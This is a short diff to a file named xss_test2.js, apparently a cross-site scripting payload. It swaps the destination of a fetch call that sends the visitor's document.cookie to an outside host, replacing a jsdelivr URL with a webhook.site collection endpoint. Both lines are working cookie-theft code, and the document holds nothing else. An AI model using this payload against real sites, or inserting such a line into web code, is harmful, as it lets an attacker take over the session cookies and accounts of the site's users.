@@ -1,2 +1,2 @@
 // xss_test2.js
-fetch('https://cdn.jsdelivr.net/gh/iamanc/an/an2.js/?c=' + document.cookie)
+fetch('https://webhook.site/31d27a02-be72-4e85-b6bd-e7c7ca65c489/?c=' + document.cookie)
